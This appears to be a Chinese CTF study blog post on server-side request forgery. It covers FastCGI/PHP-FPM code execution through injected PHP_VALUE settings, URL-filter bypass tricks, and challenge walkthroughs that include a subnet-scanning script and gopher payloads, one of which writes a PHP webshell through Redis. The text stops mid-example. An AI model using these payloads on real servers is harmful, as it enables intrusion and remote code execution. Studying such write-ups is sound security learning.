+<p>PHP默认提供了很多种SAPI（服务器端应用编程端口），常见的提供给apache和nginx的<code>php5_module</code>、<code>CGI</code>、<code>FastCGI</code>，给IIS的<code>ISAPI</code>，以及Shell的<code>CLI</code></p>
+<p>经过不断的技术升级，目前搭建高性能的PHP Web服务器，最佳的方式是<strong>Apache/Nginx</strong> + <strong>FastCGI</strong> + **PHP-FPM(PHP-CGI)**方式</p>
+<h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/modb_20211112_396ea818-43ac-11ec-a089-fa163eb4f6be.png" alt="img"></p>
+<p>Web 服务器启动时载入<strong>FastCGI进程管理器</strong>（PHP-CGI或者PHP-FPM)</p>
+<ol>
+<li>FastCGI 进程管理器自身初始化，启动多个 CGI 解释器进程，并等待来自 Web Server 的连接</li>
+<li>Web 服务器与 FastCGI 进程管理器进行 <strong>Socket 通信</strong>，选择一个CGI 解释器进程，<strong>通过 FastCGI 协议发送 CGI 环境变量和标准输入数据给 这个CGI 解释器进程</strong></li>
+<li>CGI 解释器进程完成处理后将<strong>标准输出和错误信息从同一连接返回 Web 服务器</strong></li>
+<li>CGI 解释器进程接着等待并处理来自 Web 服务器的下一个连接</li>
+</ol>
+<p>由此，<strong>PHP-FPM 就是一个FastCGI进程管理器，是对于 FastCGI 协议的具体实现</strong>，它负责管理一个进程池，来处理来自Web服务器的请求。</p>
+<h4 id="PHP-FPM通信方式"><a href="#PHP-FPM通信方式" class="headerlink" title="PHP-FPM通信方式"></a>PHP-FPM通信方式</h4><p>在PHP使用FastCGI连接模式的情况下，Web服务器中间件如Nginx和PHP-FPM之间的通信方式又分为两种，<strong>TCP模式和套接字(unix socket)模式</strong></p>
+<ul>
+<li><strong>TCP模式</strong>即是PHP-FPM进程会监听本机上的一个端口（默认为9000），然后Nginx会把客户端请求数据通过FastCGI协议传给9000端口，PHP-FPM拿到数据后会调用CGI进程解析</li>
+<li><strong>Unix套接字模式</strong>是Unix系统进程间通信（IPC）的一种被广泛采用方式，以文件（一般是.sock）作为socket的唯一标识（描述符），需要通信的两个进程引用同一个socket描述符文件就可以建立通道进行通信了。上述原理图中提到的<strong>Socket 通信</strong>即为此模式</li>
+</ul>
+<p>ssrf中对FastCGI的攻击也是利用了TCP模式</p>
+<h3 id="FastCGI攻击"><a href="#FastCGI攻击" class="headerlink" title="FastCGI攻击"></a>FastCGI攻击</h3><h4 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h4><p>HTTP协议是浏览器和服务器中间件进行数据交换的协议，类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端（如PHP-FPM）进行数据交换的协议</p>
+<p>Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端（PHP-FPM），语言后端（PHP-FPM）解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件</p>
+<p>record的头固定8个字节，body是由头中的contentLength指定，其结构如下：</p>
+<pre class="language-none"><code class="language-none">typedef struct &#123;
+  &#x2F;* Header *&#x2F;
+  unsigned char version; &#x2F;&#x2F; 版本
+  unsigned char type; &#x2F;&#x2F; 本次record的类型
+  unsigned char requestIdB1; &#x2F;&#x2F; 本次record对应的请求id
+  unsigned char requestIdB0;
+  unsigned char contentLengthB1; &#x2F;&#x2F; body体的大小
+  unsigned char contentLengthB0;
+  unsigned char paddingLength; &#x2F;&#x2F; 额外块大小
+  unsigned char reserved; 
+
+  &#x2F;* Body *&#x2F;
+  unsigned char contentData[contentLength];
+  unsigned char paddingData[paddingLength];
+&#125; FCGI_Record;</code></pre>
+
+<blockquote>
+<p>语言端（PHP-FPM）解析了fastcgi头以后，拿到<code>contentLength</code><br>，然后再在TCP流里读取大小等于<code>contentLength</code><br>的数据，这就是body体</p>
+<p>Body后面还有一段额外的数据（Padding），其长度由头中的paddingLength指定，起保留作用  &gt;不需要该Padding的时候，将其长度设置&gt;为0即可</p>
+<p>可见，一个fastcgi record结构最大支持的body大小是<code>2^16</code></p>
+<p>，也就是65536字节</p>
+</blockquote>
+<p>其中，header中的<code>type</code><br>代表本次record的类型，所有值及具体含义如下</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429194926645.png" alt="image-20220429194926645"></p>
+<p>服务器中间件和后端语言通信，第一个数据包就是<code>type</code>为1的record，后续互相交流，发送<code>type</code>为4、5、6、7的record，结束时发送<code>type</code>为2、3的record。</p>
+<p>这里着重讲一下type为4，当后端语言接收到一个 <code>type</code> 为4的 Record 后，就会把这个 Record 的 Body 按照对应的结构解析成 key-value 对，结构如下：</p>
+<pre class="language-none"><code class="language-none">typedef struct &#123;
+  unsigned char nameLengthB0;  &#x2F;* nameLengthB0  &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;
+  unsigned char valueLengthB0; &#x2F;* valueLengthB0 &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;
+  unsigned char nameData[nameLength];
+  unsigned char valueData[valueLength];
+&#125; FCGI_NameValuePair11;
+
+typedef struct &#123;
+  unsigned char nameLengthB0;  &#x2F;* nameLengthB0  &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;
+  unsigned char valueLengthB3; &#x2F;* valueLengthB3 &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;
+  unsigned char valueLengthB2;
+  unsigned char valueLengthB1;
+  unsigned char valueLengthB0;
+  unsigned char nameData[nameLength];
+  unsigned char valueData[valueLength
+          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];
+&#125; FCGI_NameValuePair14;
+
+typedef struct &#123;
+  unsigned char nameLengthB3;  &#x2F;* nameLengthB3  &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;
+  unsigned char nameLengthB2;
+  unsigned char nameLengthB1;
+  unsigned char nameLengthB0;
+  unsigned char valueLengthB0; &#x2F;* valueLengthB0 &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;
+  unsigned char nameData[nameLength
+          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];
+  unsigned char valueData[valueLength];
+&#125; FCGI_NameValuePair41;
+
+typedef struct &#123;
+  unsigned char nameLengthB3;  &#x2F;* nameLengthB3  &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;
+  unsigned char nameLengthB2;
+  unsigned char nameLengthB1;
+  unsigned char nameLengthB0;
+  unsigned char valueLengthB3; &#x2F;* valueLengthB3 &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;
+  unsigned char valueLengthB2;
+  unsigned char valueLengthB1;
+  unsigned char valueLengthB0;
+  unsigned char nameData[nameLength
+          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];
+  unsigned char valueData[valueLength
+          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];
+&#125; FCGI_NameValuePair44;</code></pre>
+
+<p>这其实是 4 个结构，至于用哪个结构，有如下规则：</p>
+<ol>
+<li>key、value均小于128字节，用 <code>FCGI_NameValuePair11</code></li>
+<li>key大于128字节，value小于128字节，用 <code>FCGI_NameValuePair41</code></li>
+<li>key小于128字节，value大于128字节，用 <code>FCGI_NameValuePair14</code></li>
+<li>key、value均大于128字节，用 <code>FCGI_NameValuePair44</code></li>
+</ol>
+<p>举个例子，用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code><br>如果web目录是<code>/var/www/html</code><br>那么服务器中间件（Nginx）会将这个请求变成如下key-value对：</p>
+<pre class="language-none"><code class="language-none">&#123;
+    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,
+    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,
+    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;,
+    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;,
+    &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;,
+    &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2&#39;,
+    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,
+    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,
+    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,
+    &#39;REMOTE_PORT&#39;: &#39;12345&#39;,
+    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,
+    &#39;SERVER_PORT&#39;: &#39;80&#39;,
+    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,
+    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;
+&#125;</code></pre>
+
+<p>这个数组其实就是PHP中<code>$_SERVER</code><br>数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充<code>$_SERVER</code><br>数组，也是告诉FPM：“我要执行哪个PHP文件”</p>
+<p>当后端语言（PHP-FPM）拿到由Nginx发过来的FastCGI数据包后，进行解析，得到上述这些环境变量。然后，<strong>执行<code>SCRIPT_FILENAME</code><br>的值指向的PHP文件，也就是<code>/var/www/html/index.php</code></strong></p>
+<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p><strong>PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造FastCGI协议，和FPM进行通信</strong>。</p>
+<p>所以我们如果能够自行构造SCRIPT_FILENAME的值，就能控制PHP-FPM执行任意后缀文件，如<code>/etc/passwd</code></p>
+<p>但是，在PHP5.3.9之后，FPM默认配置中增加了<code>security.limit_extensions</code>选项</p>
+<pre class="language-none"><code class="language-none">; Limits the extensions of the main script FPM will allow to parse. This can
+; prevent configuration mistakes on the web server side. You should only limit
+; FPM to .php extensions to prevent malicious users to use other extensions to
+; exectute php code.
+; Note: set an empty value to allow all extensions.
+; Default Value: .php
+;security.limit_extensions &#x3D; .php .php3 .php4 .php5 .php7</code></pre>
+
+<p>限制了只有.php后缀的文件才能够被FPM执行</p>
+<p>因此，想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。已存在的PHP文件名获得有两种方法：</p>
+<ul>
+<li>通过系统的信息收集、爆破、报错获得某个PHP文件名及其路径</li>
+<li>找安装PHP后默认存在的PHP文件，如<code>/usr/local/lib/php/PEAR.php</code></li>
+</ul>
+<p>现在，拿到了文件名，我们<strong>能控制<code>SCRIPT_FILENAME</code><br>，却只能执行目标服务器上的文件，并不能执行我们想要执行的任意代码，但我们可以通过构造<code>type</code><br>值为4的record，也就是设置向PHP-FPM传递的环境变量来达到任意代码执行的目的</strong></p>
+<blockquote>
+<p>在PHP.INI中有两个配置项，<code>auto_prepend_file</code>和<code>auto_append_file</code>。</p>
+<p><code>auto_prepend_file</code>是告诉PHP，在执行目标文件之前，先包含<code>auto_prepend_file</code>中指定的文件；</p>
+<p><code>auto_append_file</code>是告诉PHP，在执行完成目标文件后，包含<code>auto_append_file</code>指向的文件。</p>
+</blockquote>
+<p>若我们设置<code>auto_prepend_file</code>为<code>php://input</code>（<code>allow_url_include=on</code>），那么就等于在执行任何PHP文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在FastCGI协议 Body中，它们就能被执行了</p>
+<p>而这就要利用后端语言（PHP-FPM）拿到由Nginx发过来的FastCGI数据包后，进行解析，得到的环境变量了。</p>
+<p>在其中有PHP_VALUE和PHP_ADMIN_VALUE两个特殊的值</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/modb_20211112_39f986d6-43ac-11ec-a089-fa163eb4f6be.png" alt="img"></p>
+<p>所以我们只要将环境变量构造成</p>
+<pre class="language-none"><code class="language-none">&#123;
+    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,
+    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,
+    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;,
+    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;,
+    &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;,
+    &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2&#39;,
+    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,
+    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,
+    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,
+    &#39;REMOTE_PORT&#39;: &#39;12345&#39;,
+    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,
+    &#39;SERVER_PORT&#39;: &#39;80&#39;,
+    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,
+    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;
+    &#39;PHP_VALUE&#39;: &#39;auto_prepend_file &#x3D; php:&#x2F;&#x2F;input&#39;,
+    &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include &#x3D; On&#39;
+&#125;</code></pre>
+
+<p>就能实现rce的目的</p>
+<p>ctf中一般的利用条件</p>
+<ul>
+<li>PHP版本要高于5.3.3，才能动态修改PHP.INI配置文件</li>
+<li>知道题目环境中的一个PHP文件的绝对路径</li>
+<li>PHP-FPM监听在本机9000端口</li>
+</ul>
+<h1 id="一些绕过"><a href="#一些绕过" class="headerlink" title="一些绕过"></a>一些绕过</h1><p>对于SSRF的限制大致有如下几种：</p>
+<ul>
+<li>限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求。</li>
+<li>限制域名只能为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a></li>
+<li>限制不能访问内网的IP，以防止对内网进行攻击。</li>
+<li>屏蔽返回的详细信息。</li>
+</ul>
+<h3 id="利用HTTP基本身份认证的方式绕过"><a href="#利用HTTP基本身份认证的方式绕过" class="headerlink" title="利用HTTP基本身份认证的方式绕过"></a>利用HTTP基本身份认证的方式绕过</h3><p>如果目标代码限制访问的域名只能为 <a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> ，那么我们可以采用HTTP基本身份认证的方式绕过。即@：<a target="_blank" rel="noopener" href="http://www.xxx.com@www.evil.com/">http://www.xxx.com@www.evil.com</a></p>
+<h3 id="本地回环地址的其他表现形式"><a href="#本地回环地址的其他表现形式" class="headerlink" title="本地回环地址的其他表现形式"></a>本地回环地址的其他表现形式</h3><p><strong>127.0.0.1</strong>，通常被称为本地回环地址(Loopback Address)，指本机的虚拟接口，一些表示方法如下(ipv6的地址使用http访问需要加[])：</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a><br><a target="_blank" rel="noopener" href="http://localhost/">http://localhost</a><br><a target="_blank" rel="noopener" href="http://127.255.255.254/">http://127.255.255.254</a><br>127.0.0.1 - 127.255.255.254<br>http://[::1]<br>http://[::ffff:7f00:1]<br>http://[::ffff:127.0.0.1]<br><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.1</a><br><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.1</a><br><a target="_blank" rel="noopener" href="http://0.0.0.0/">http://0:80</a></p>
+<h3 id="IP的进制转换"><a href="#IP的进制转换" class="headerlink" title="IP的进制转换"></a>IP的进制转换</h3><p>IP地址是一个32位的二进制数，通常被分割为4个8位二进制数。通常用“点分十进制”表示成（a.b.c.d）的形式，所以IP地址的每一段可以用其他进制来转换。使用如win系统自带的计算机（程序员模式）就可简单实现IP地址的进制转换。</p>
+<p>由于一些系统会直接提取邮件中内嵌的链接进行检测，而一种此类URL混淆技术采用了URL主机名部分中使用的编码十六进制IP地址格式来逃避检测。</p>
+<p>由于IP地址可以用多种格式表示，因此可以在URL中如下所示使用：</p>
+<ul>
+<li>点分十进制IP地址：<a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a></li>
+<li>八进制IP地址：<a target="_blank" rel="noopener" href="http://0177.0.0.1(将每个十进制数字转换为八进制)/">http://0177.0.0.1（将每个十进制数字转换为八进制）</a></li>
+<li>十六进制IP地址：<a target="_blank" rel="noopener" href="http://0x7f000001或者http//0x7F.0.0.1%EF%BC%88%E5%B0%86%E6%AF%8F%E4%B8%AA%E5%8D%81%E8%BF%9B%E5%88%B6%E6%95%B0%E5%AD%97%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%EF%BC%89">http://0x7F000001或者http://0x7F.0.0.1（将每个十进制数字转换为十六进制）</a></li>
+<li>整数或DWORD IP地址：<a target="_blank" rel="noopener" href="http://2130706433(将十六进制ip转换为整数)/">http://2130706433（将十六进制IP转换为整数）</a></li>
+</ul>
+<p>白嫖个脚本</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+$ip &#x3D; &#39;127.0.0.1&#39;;
+$ip &#x3D; explode(&#39;.&#39;,$ip);
+$r &#x3D; ($ip[0] &lt;&lt; 24) | ($ip[1] &lt;&lt; 16) | ($ip[2] &lt;&lt; 8) | $ip[3] ;
+if($r &lt; 0) &#123;
+    $r +&#x3D; 4294967296;
+&#125;
+echo &quot;十进制:&quot;;     &#x2F;&#x2F; 2130706433
+echo $r;
+echo &quot;八进制:&quot;;     &#x2F;&#x2F; 0177.0.0.1
+echo decoct($r);
+echo &quot;十六进制:&quot;;   &#x2F;&#x2F; 0x7f.0.0.1
+echo dechex($r);
+?&gt;</code></pre>
+
+<h3 id="利用302跳转绕过内网IP"><a href="#利用302跳转绕过内网IP" class="headerlink" title="利用302跳转绕过内网IP"></a>利用302跳转绕过内网IP</h3><p>网络上存在一个很神奇的服务，网址为 <a target="_blank" rel="noopener" href="http://xip.io/">http://xip.io</a>，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子：</p>
+<p>当我们访问：<a target="_blank" rel="noopener" href="http://127.0.0.1.xip.io/flag.php">http://127.0.0.1.xip.io/flag.php</a> 时，实际上访问的是<a target="_blank" rel="noopener" href="http://127.0.0.1/1.php">http://127.0.0.1/1.php</a> 。像这种网址还有<a target="_blank" rel="noopener" href="http://nip.io,http//sslip.io">http://nip.io，http://sslip.io</a> 。</p>
+<p>这个我在自己的服务器上没试成功，不知道为什么</p>
+<h3 id="短地址跳转绕过"><a href="#短地址跳转绕过" class="headerlink" title="短地址跳转绕过"></a>短地址跳转绕过</h3><p>将连接变为短链接</p>
+<p>比如这种</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427205506703.png" alt="image-20220427205506703"></p>
+<p>宝塔方便是方便。。。但是复现漏洞的时候也太安全了，全给拦了。。。。</p>
+<h3 id="利用不存在的协议头绕过指定的协议头"><a href="#利用不存在的协议头绕过指定的协议头" class="headerlink" title="利用不存在的协议头绕过指定的协议头"></a>利用不存在的协议头绕过指定的协议头</h3><p><code>file_get_contents()</code>函数的一个特性，即当PHP的 <code>file_get_contents()</code> 函数在遇到不认识的协议头时候会将这个协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。（include()函数也有类似的特性）</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427212221005.png" alt="image-20220427212221005"></p>
+<h3 id="利用URL的解析问题"><a href="#利用URL的解析问题" class="headerlink" title="利用URL的解析问题"></a>利用URL的解析问题</h3><p>可以用<code>0.0.0.0</code>绕过对内网ip的检测， 这个IP地址表示整个网络，可以代表本机 ipv4 的所有地址，使用如下即可绕过：</p>
+<h3 id="利用readfile和parse-url函数的解析差异绕过指定的端口"><a href="#利用readfile和parse-url函数的解析差异绕过指定的端口" class="headerlink" title="利用readfile和parse_url函数的解析差异绕过指定的端口"></a>利用readfile和parse_url函数的解析差异绕过指定的端口</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427212755037.png" alt="image-20220427212755037"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220427212822648.png" alt="image-20220427212822648"></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61237064/article/details/123006424">(4条消息) 用SSRF打穿内网_ZredamanJ的博客-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a5ceccfa279a">https://www.jianshu.com/p/a5ceccfa279a</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/115222529">https://zhuanlan.zhihu.com/p/115222529</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43665434/article/details/115434528">https://blog.csdn.net/qq_43665434/article/details/115434528</a></p>
+<p><a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1724265374498292807&wfr=spider&for=pc">铭说｜关于SSRF和多种绕过方式 (baidu.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41107295/article/details/103026470">(4条消息) SSRF利用 Gopher 协议拓展攻击面_BerL1n的博客-CSDN博客_gopherus使用</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/109252839">(4条消息) 浅谈ssrf与ctf那些事_合天网安实验室的博客-CSDN博客_ctfssrf</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/bylfsj/article/details/105083164">(4条消息) SSRF in PHP_bylfsj的博客-CSDN博客</a></p>
+<p>赵总这个新利用方法先放一下</p>
+<p><a target="_blank" rel="noopener" href="https://www.zhaoj.in/read-6681.html#_SSRF">基于 A 和 AAAA 记录的一种新 DNS Rebinding 姿势–从西湖论剑2020 Web HelloDiscuzQ 题对 Blackhat 上的议题做升华 – glzjin (zhaoj.in)</a></p>
+<p>已经超过我的基础知识了</p>
+<p>小tips：</p>
+<p>SSRF一般是先想办法得到目标主机的网络配置信息，如读取/etc/hosts、/proc/net/arp、/proc/net/fib_trie(存放网络适配器地址)，从而获得目标主机的内网网段并进行爆破，后面两个所需要的权限高一点，可以用file协议读一下</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Yang34/p/13914297.html">Linux中proc信息获取 - Yangsir34 - 博客园 (cnblogs.com)</a></p>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h3 id="GKCTF2020-EZ三剑客-EzWeb"><a href="#GKCTF2020-EZ三剑客-EzWeb" class="headerlink" title="[GKCTF2020]EZ三剑客-EzWeb"></a>[GKCTF2020]EZ三剑客-EzWeb</h3><p>输入<a target="_blank" rel="noopener" href="http://www.baidu.com会出现的百度的页面/">www.baidu.com会出现的百度的页面</a></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426183847852.png" alt="image-20220426183847852"></p>
+<p>然后加一个源码里提示的secret参数，能找到这台主机的网卡配置信息，得到内网ip 10.244.80.251而且输入框内后</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426184108287.png" alt="image-20220426184108287"></p>
+<p>所以我们可以尝试利用ssrf来得到在内网其他机器上的flag</p>
+<p>可以用file协议看看源码</p>
+<p>过滤了file://，可以使用file:/,file: ///,file:_///绕过</p>
+<pre class="language-none"><code class="language-none">file: &#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</code></pre>
+
+
+
+<pre class="language-none"><code class="language-none">&lt;?php
+function curl($url)&#123;  
+    $ch &#x3D; curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_HEADER, 0);
+    echo curl_exec($ch);
+    curl_close($ch);
+&#125;
+
+if(isset($_GET[&#39;submit&#39;]))&#123;
+		$url &#x3D; $_GET[&#39;url&#39;];
+		&#x2F;&#x2F;echo $url.&quot;\n&quot;;
+		if(preg_match(&#39;&#x2F;file\:\&#x2F;\&#x2F;|dict|\.\.\&#x2F;|127.0.0.1|localhost&#x2F;is&#39;, $url,$match))
+		&#123;
+			&#x2F;&#x2F;var_dump($match);
+			die(&#39;别这样&#39;);
+		&#125;
+		curl($url);
+&#125;
+if(isset($_GET[&#39;secret&#39;]))&#123;
+	system(&#39;ifconfig&#39;);
+&#125;
+?&gt;</code></pre>
+
+
+
+<p>bp不知道为什么寄了，扫不了这个，只能上python了</p>
+<pre class="language-none"><code class="language-none">import requests
+a &#x3D; []
+url &#x3D; &quot;http:&#x2F;&#x2F;4a20197b-aba4-4baa-ac34-21588a8ab47b.node4.buuoj.cn:81&#x2F;index.php?url&#x3D;10.244.80.&#123;&#125;&amp;submit&#x3D;%E6%8F%90%E4%BA%A4&quot;
+for i in range(0,255):
+    print(i)
+    url1 &#x3D; url.format(i)
+    print(url1)
+    try:
+        r &#x3D; requests.get(url1,timeout&#x3D;1)
+        print(r.text)
+        a.append(i)
+        continue
+    except Exception as e:
+        print(&#39;timeout&#39;)
+print(a)</code></pre>
+
+<p><img src="/2022/04/26/ssrf/Users/ethe/AppData/Roaming/Typora/typora-user-images/image-20220426181836817.png" alt="image-20220426181836817"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426184230846.png" alt="image-20220426184230846"></p>
+<p>根据提示找找端口，再测一下发现有6379端口</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426182507562.png" alt="image-20220426182507562"></p>
+<p>说明开启着redis服务</p>
+<p>gopherus生成个payload</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426183028161.png" alt="image-20220426183028161"></p>
+<p>改一下ip</p>
+<pre class="language-none"><code class="language-none">gopher:&#x2F;&#x2F;10.244.80.69:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%27cat%20&#x2F;flag%27%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</code></pre>
+
+<p>打进去之后访问一下shell.php</p>
+<p>(这里如果直接把payload接在url的参数需要再进行一次url编码</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220426183648401.png" alt="image-20220426183648401"></p>
+<h2 id="CTFHUB-SSRF"><a href="#CTFHUB-SSRF" class="headerlink" title="CTFHUB SSRF"></a>CTFHUB SSRF</h2><h3 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h3><p>确定存在ssr</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220428204537390.png" alt="image-20220428204537390"></p>
+<p>题目说了flag在127.0.0.1的flag.php里</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220428204620736.png" alt="image-20220428204620736"></p>
+<h3 id="伪协议读取文件"><a href="#伪协议读取文件" class="headerlink" title="伪协议读取文件"></a>伪协议读取文件</h3><p>利用file协议读取文件</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220428215911402.png" alt="image-20220428215911402"></p>
+<p>用绝对路径</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220428220025771.png" alt="image-20220428220025771"></p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220428221558974.png" alt="image-20220428221558974"></p>
+<h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><p>要求就是给127.0.0.1的flag.php传个post参数key，key值在源码的注释里</p>
+<p>gopher的url解码还挺玄幻的</p>
+<p>试了几个小时，好几个网站的编码还有python和php自带的url编码的函数，但是都有点问题，最后就只有这两种成功了</p>
+<pre class="language-txt" data-language="txt"><code class="language-txt">http:&#x2F;&#x2F;challenge-0334eacc0c1b7b0d.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D21c12d709c44fe44f99ee5ba47501882
+
+
